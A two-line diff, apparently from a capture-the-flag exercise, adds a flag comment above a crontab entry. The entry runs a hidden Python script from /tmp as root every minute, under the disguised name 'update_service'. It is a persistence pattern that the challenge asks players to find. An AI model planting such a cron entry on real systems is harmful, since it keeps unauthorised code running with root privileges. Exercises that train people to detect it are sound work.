@@ -1,1 +1,2 @@
+# ctf{Found_Rogue_Location}
 * * * * * root pgrep -f update_service.py > /dev/null || python -u /tmp/.update_service.py
